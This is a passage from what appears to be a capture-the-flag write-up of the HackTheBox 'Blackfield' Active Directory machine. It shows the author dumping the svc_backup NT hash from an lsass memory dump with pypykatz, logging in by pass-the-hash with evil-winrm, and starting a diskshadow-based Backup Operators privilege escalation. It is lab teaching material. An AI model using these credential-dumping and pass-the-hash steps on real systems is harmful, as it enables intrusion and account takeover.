</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>-------------------------------------------------------------------------------
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>Administrator<span class="w">       </span>Ipwn3dYourCompany<span class="w">     </span>
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div>
<p>Very interesting, i dont remember seeing that on bloodhound! lets keep in that in mind and revisit it later</p>
<p><code>domain_groups.txt</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>Group<span class="w"> </span>Accounts<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="se">\\\\</span>DC01
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>-------------------------------------------------------------------------------
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>*Cloneable<span class="w"> </span>Domain<span class="w"> </span>Controllers
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>*DnsUpdateProxy
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>*Domain<span class="w"> </span>Admins
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>*Domain<span class="w"> </span>Computers
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>*Domain<span class="w"> </span>Controllers
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a>*Domain<span class="w"> </span>Guests
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>*Domain<span class="w"> </span>Users
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a>*Enterprise<span class="w"> </span>Admins
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a>*Enterprise<span class="w"> </span>Key<span class="w"> </span>Admins
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>*Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a>*Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners
</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a>*Key<span class="w"> </span>Admins
</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a>*Protected<span class="w"> </span>Users
</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a>*Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a>*Schema<span class="w"> </span>Admins
</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div></p>
<p><code>domain_users.txt</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>User<span class="w"> </span>accounts<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="se">\\\\</span>DC01
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>-------------------------------------------------------------------------------
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>Administrator<span class="w">            </span>audit2020<span class="w">                </span>BLACKFIELD103974<span class="w">         </span>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>BLACKFIELD106360<span class="w">         </span>BLACKFIELD107197<span class="w">         </span>BLACKFIELD112766<span class="w">         </span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>.......<span class="w">    </span>
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>BLACKFIELD998321<span class="w">         </span>Guest<span class="w">                    </span>Ipwn3dYouCompany
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>krbtgt<span class="w">                   </span>lydericlefebvre<span class="w">          </span>support<span class="w">                  </span>
</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div></p>
<p>here we see again this user <code>Ipwn3dYouCompany</code> which i did not find in bloodhound</p>
<p>the rest of the txt files provide no useful information.</p>
<p>Lets now inspect the <code>memory_analysis</code> folder:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:28:33<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:28:33<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="w">  </span>conhost.zip<span class="w">                         </span>A<span class="w"> </span><span class="m">37876530</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:25:36<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="w">  </span>ctfmon.zip<span class="w">                          </span>A<span class="w"> </span><span class="m">24962333</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:25:45<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="w">  </span>dfsrs.zip<span class="w">                           </span>A<span class="w"> </span><span class="m">23993305</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:25:54<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="w">  </span>dllhost.zip<span class="w">                         </span>A<span class="w"> </span><span class="m">18366396</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:26:04<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="w">  </span>ismserv.zip<span class="w">                         </span>A<span class="w">  </span><span class="m">8810157</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:26:13<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="w">  </span>lsass.zip<span class="w">                           </span>A<span class="w"> </span><span class="m">41936098</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:25:08<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="w">  </span>mmc.zip<span class="w">                             </span>A<span class="w"> </span><span class="m">64288607</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:25:25<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="w">  </span>RuntimeBroker.zip<span class="w">                   </span>A<span class="w"> </span><span class="m">13332174</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:26:24<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a><span class="w">  </span>ServerManager.zip<span class="w">                   </span>A<span class="w"> </span><span class="m">131983313</span><span class="w"> </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:26:49<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a><span class="w">  </span>sihost.zip<span class="w">                          </span>A<span class="w"> </span><span class="m">33141744</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:00<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a><span class="w">  </span>smartscreen.zip<span class="w">                     </span>A<span class="w"> </span><span class="m">33756344</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:11<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a><span class="w">  </span>svchost.zip<span class="w">                         </span>A<span class="w"> </span><span class="m">14408833</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:19<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a><span class="w">  </span>taskhostw.zip<span class="w">                       </span>A<span class="w"> </span><span class="m">34631412</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:30<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a><span class="w">  </span>winlogon.zip<span class="w">                        </span>A<span class="w"> </span><span class="m">14255089</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:38<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a><span class="w">  </span>wlms.zip<span class="w">                            </span>A<span class="w">  </span><span class="m">4067425</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:44<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a><span class="w">  </span>WmiPrvSE.zip<span class="w">                        </span>A<span class="w"> </span><span class="m">18303252</span><span class="w">  </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">16</span>:27:53<span class="w"> </span><span class="m">2020</span>
</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>
</span><span id="__span-44-20"><a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a><span class="w">                </span><span class="m">7846143</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">3490514</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div><br />
very interesting, each one of those is a memory dump file!<br />
well without any hesitation, we must first try doing sth with <code>lsass.zip</code> for obvious reasons, lets unzip it first<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>unzip<span class="w"> </span>lsass.zip
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>Archive:<span class="w">  </span>lsass.zip
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="w">  </span>inflating:<span class="w"> </span>lsass.DMP<span class="w"> </span>
</span></code></pre></div></p>
<p>now check what type of file it is<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>file<span class="w"> </span>lsass.DMP
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>lsass.DMP:<span class="w"> </span>Mini<span class="w"> </span>DuMP<span class="w"> </span>crash<span class="w"> </span>report,<span class="w"> </span><span class="m">16</span><span class="w"> </span>streams,<span class="w"> </span>Sun<span class="w"> </span>Feb<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">18</span>:02:01<span class="w"> </span><span class="m">2020</span>,<span class="w"> </span>0x421826<span class="w"> </span><span class="nb">type</span>
</span></code></pre></div></p>
<p>with a little bit of research, i found <code>pypykatz</code> would be usefull to dump this file<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>lsass.DMP
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>INFO:root:Parsing<span class="w"> </span>file<span class="w"> </span>lsass.DMP<span class="w">                          </span>
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>FILE:<span class="w"> </span><span class="o">========</span><span class="w"> </span>lsass.DMP<span class="w"> </span><span class="o">=======</span><span class="w">                          </span>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="o">==</span><span class="w"> </span><span class="nv">LogonSession</span><span class="w"> </span><span class="o">==</span>
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>authentication_id<span class="w"> </span><span class="m">406458</span><span class="w"> </span><span class="o">(</span>633ba<span class="o">)</span><span class="w">                    </span>
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>session_id<span class="w"> </span><span class="m">2</span>
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>username<span class="w"> </span>svc_backup<span class="w">                        </span>
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>domainname<span class="w"> </span>BLACKFIELD<span class="w">                               </span>
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>logon_server<span class="w"> </span>DC01
</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>logon_time<span class="w"> </span><span class="m">2020</span>-02-23T18:00:03.423728+00:00
</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>sid<span class="w"> </span>S-1-5-21-4194615774-2175524697-3563712290-1413<span class="w">  </span>
</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>luid<span class="w"> </span><span class="nv">406458</span>
</span><span id="__span-47-13"><a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a><span class="w">        </span><span class="o">==</span><span class="w"> </span><span class="nv">MSV</span><span class="w"> </span><span class="o">==</span><span class="w">                          </span>
</span><span id="__span-47-14"><a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a><span class="w">                </span>Username:<span class="w"> </span>svc_backup<span class="w">                      </span>
</span><span id="__span-47-15"><a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a><span class="w">                </span>Domain:<span class="w"> </span>BLACKFIELD<span class="w">   </span>
</span><span id="__span-47-16"><a id="__codelineno-47-16" name="__codelineno-47-16" href="#__codelineno-47-16"></a><span class="w">                </span>LM:<span class="w"> </span>NA<span class="w">                              </span>
</span><span id="__span-47-17"><a id="__codelineno-47-17" name="__codelineno-47-17" href="#__codelineno-47-17"></a><span class="w">                </span>NT:<span class="w"> </span>9658d1d1dcd9250115e2205d9f48400d
</span><span id="__span-47-18"><a id="__codelineno-47-18" name="__codelineno-47-18" href="#__codelineno-47-18"></a><span class="w">                </span>SHA1:<span class="w"> </span><span class="nv">463c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
</span><span id="__span-47-19"><a id="__codelineno-47-19" name="__codelineno-47-19" href="#__codelineno-47-19"></a><span class="w">        </span><span class="o">==</span><span class="w"> </span>WDIGEST<span class="w"> </span><span class="o">[</span>633ba<span class="o">]==</span><span class="w">                              </span>
</span><span id="__span-47-20"><a id="__codelineno-47-20" name="__codelineno-47-20" href="#__codelineno-47-20"></a><span class="w">                </span>username<span class="w"> </span>svc_backup
</span><span id="__span-47-21"><a id="__codelineno-47-21" name="__codelineno-47-21" href="#__codelineno-47-21"></a><span class="w">                </span>domainname<span class="w"> </span>BLACKFIELD
</span><span id="__span-47-22"><a id="__codelineno-47-22" name="__codelineno-47-22" href="#__codelineno-47-22"></a><span class="w">                </span>password<span class="w"> </span><span class="nv">None</span><span class="w">                             </span>
</span><span id="__span-47-23"><a id="__codelineno-47-23" name="__codelineno-47-23" href="#__codelineno-47-23"></a><span class="w">        </span><span class="o">==</span><span class="w"> </span>SSP<span class="w"> </span><span class="o">[</span>633ba<span class="o">]==</span><span class="w">             </span>
</span><span id="__span-47-24"><a id="__codelineno-47-24" name="__codelineno-47-24" href="#__codelineno-47-24"></a><span class="w">                </span>username<span class="w">                   </span>
</span><span id="__span-47-25"><a id="__codelineno-47-25" name="__codelineno-47-25" href="#__codelineno-47-25"></a><span class="w">                </span>domainname
</span><span id="__span-47-26"><a id="__codelineno-47-26" name="__codelineno-47-26" href="#__codelineno-47-26"></a><span class="w">                </span>password<span class="w"> </span><span class="nv">None</span>
</span><span id="__span-47-27"><a id="__codelineno-47-27" name="__codelineno-47-27" href="#__codelineno-47-27"></a><span class="w">        </span><span class="o">==</span><span class="w"> </span><span class="nv">Kerberos</span><span class="w"> </span><span class="o">==</span>
</span><span id="__span-47-28"><a id="__codelineno-47-28" name="__codelineno-47-28" href="#__codelineno-47-28"></a><span class="w">                </span>Username:<span class="w"> </span>svc_backup<span class="w">                      </span>
</span><span id="__span-47-29"><a id="__codelineno-47-29" name="__codelineno-47-29" href="#__codelineno-47-29"></a><span class="w">                </span>Domain:<span class="w"> </span>BLACKFIELD.LOCAL<span class="w">   </span>
</span><span id="__span-47-30"><a id="__codelineno-47-30" name="__codelineno-47-30" href="#__codelineno-47-30"></a><span class="w">                </span>Password:<span class="w"> </span><span class="nv">None</span><span class="w">                            </span>
</span><span id="__span-47-31"><a id="__codelineno-47-31" name="__codelineno-47-31" href="#__codelineno-47-31"></a><span class="w">        </span><span class="o">==</span><span class="w"> </span>WDIGEST<span class="w"> </span><span class="o">[</span>633ba<span class="o">]==</span><span class="w">                              </span>
</span><span id="__span-47-32"><a id="__codelineno-47-32" name="__codelineno-47-32" href="#__codelineno-47-32"></a><span class="w">                </span>username<span class="w"> </span>svc_backup
</span><span id="__span-47-33"><a id="__codelineno-47-33" name="__codelineno-47-33" href="#__codelineno-47-33"></a><span class="w">                </span>domainname<span class="w"> </span>BLACKFIELD
</span><span id="__span-47-34"><a id="__codelineno-47-34" name="__codelineno-47-34" href="#__codelineno-47-34"></a><span class="w">                </span>password<span class="w"> </span><span class="nv">None</span>
</span><span id="__span-47-35"><a id="__codelineno-47-35" name="__codelineno-47-35" href="#__codelineno-47-35"></a>
</span><span id="__span-47-36"><a id="__codelineno-47-36" name="__codelineno-47-36" href="#__codelineno-47-36"></a><span class="o">==</span><span class="w"> </span><span class="nv">LogonSession</span><span class="w"> </span><span class="o">==</span><span class="w">                                  </span>
</span><span id="__span-47-37"><a id="__codelineno-47-37" name="__codelineno-47-37" href="#__codelineno-47-37"></a>authentication_id<span class="w"> </span><span class="m">365835</span><span class="w"> </span><span class="o">(</span>5950b<span class="o">)</span>
</span><span id="__span-47-38"><a id="__codelineno-47-38" name="__codelineno-47-38" href="#__codelineno-47-38"></a>session_id<span class="w"> </span><span class="m">2</span>
</span><span id="__span-47-39"><a id="__codelineno-47-39" name="__codelineno-47-39" href="#__codelineno-47-39"></a>username<span class="w"> </span>UMFD-2
</span><span id="__span-47-40"><a id="__codelineno-47-40" name="__codelineno-47-40" href="#__codelineno-47-40"></a>domainname<span class="w"> </span>Font<span class="w"> </span>Driver<span class="w"> </span>Host
</span><span id="__span-47-41"><a id="__codelineno-47-41" name="__codelineno-47-41" href="#__codelineno-47-41"></a>logon_server<span class="w">                                        </span>
</span><span id="__span-47-42"><a id="__codelineno-47-42" name="__codelineno-47-42" href="#__codelineno-47-42"></a>logon_time<span class="w"> </span><span class="m">2020</span>-02-23T17:59:38.218491+00:00<span class="w">                                                                                                                                                                                                </span>
</span><span id="__span-47-43"><a id="__codelineno-47-43" name="__codelineno-47-43" href="#__codelineno-47-43"></a>sid<span class="w"> </span>S-1-5-96-0-2
</span><span id="__span-47-44"><a id="__codelineno-47-44" name="__codelineno-47-44" href="#__codelineno-47-44"></a>.......
</span></code></pre></div></p>
<p>What we see in the output above, is logon sessions, and there is a plaintext hash there for guess who, user <code>SVC_BACKUP</code> ! (if you remember from the bloodhound inspection, our goal was to reach this user)</p>
<h2 id="logging-in-as-svc_backup-via-pass-the-hash">Logging in as <code>SVC_BACKUP</code> via pass the hash</h2>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>blackfield.htb<span class="w"> </span>-u<span class="w"> </span>svc_backup<span class="w"> </span>-H<span class="w"> </span>9658d1d1dcd9250115e2205d9f48400d
</span></code></pre></div><br />
logged in, and grabbed user flag! <code>3920bb317a0bef51027e2852be64b543</code></p>
<p>proof<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132437.png" /></p>
<hr />
<h1 id="privesc">Privesc</h1>
<p>Lets remember what bloodhound showed us earlier about user <code>SVC_BACKUP</code>:</p>
<p><code>Shortest Paths to Unconstrained Delegation Systems</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132452.png" /><br />
hm this means that user <code>SVC_BACKUP</code> can remotely login, lets now inspect <code>SVC_BACKUP'</code> group membership:</p>
<p><code>Group Membership</code> of user <code>SVC_BACKUP</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132504.png" /><br />
hm so how do we privesc here? well the simplest thought here to start with, would be that this user is member of <code>BACKUP OPERATORS</code> , what do we know about this group?</p>
<p>Members of the <strong>Backup Operators</strong> group can:</p>
<ol>
<li><strong>Back up any file or folder</strong>, even if they dont have read access to it.</li>
<li><strong>Restore any file or folder</strong>, even if they dont have write access.</li>
<li>Log on <strong>locally</strong> (by default, on workstations and servers).</li>
<li><strong>Bypass NTFS permissions</strong> using specific APIs or tools (like <code>ntbackup</code>, <code>robocopy</code>, <code>wbadmin</code>, or <code>sebackupprivilege</code>/<code>serestoreprivilege</code>).</li>
</ol>
<p>Nice, this group seems to have potential for privesc, lets see our users privileges:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>whoami<span class="w"> </span>/priv
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>PRIVILEGES<span class="w"> </span>INFORMATION
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>----------------------
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                    </span><span class="nv">State</span>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">     </span>Enabled
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>SeBackupPrivilege<span class="w">             </span>Back<span class="w"> </span>up<span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w">  </span>Enabled
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>SeRestorePrivilege<span class="w">            </span>Restore<span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w">  </span>Enabled
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>SeShutdownPrivilege<span class="w">           </span>Shut<span class="w"> </span>down<span class="w"> </span>the<span class="w"> </span>system<span class="w">           </span>Enabled
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">       </span>Enabled
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w"> </span>Enabled
</span></code></pre></div>
<h3 id="abusing-backup-operators-privileges">Abusing <code>BACKUP OPERATORS</code> privileges</h3>
<p>So searching for resources about abusing <code>BACKUP OPERATORS</code> i found this:<br />
<a href="https://www.hackingarticles.in/addself-active-directory-abuse/">https://www.hackingarticles.in/addself-active-directory-abuse/</a></p>
<p>And according to it, i run the following commands as described there:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1"># on your machine:</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>$<span class="w"> </span>cat<span class="w"> </span>sth.dsh<span class="w"> </span>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="nb">set</span><span class="w"> </span>context<span class="w"> </span>persistent<span class="w"> </span>nowriters
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>add<span class="w"> </span>volume<span class="w"> </span>c:<span class="w"> </span><span class="nb">alias</span><span class="w"> </span>sth
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>create
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>expose<span class="w"> </span>%sth%<span class="w"> </span>z:
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>$<span class="w"> </span>unix2dos<span class="w"> </span>sth.dsh
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>unix2dos:<span class="w"> </span>converting<span class="w"> </span>file<span class="w"> </span>sth.dsh<span class="w"> </span>to<span class="w"> </span>DOS<span class="w"> </span>format...
</span></code></pre></div></p>
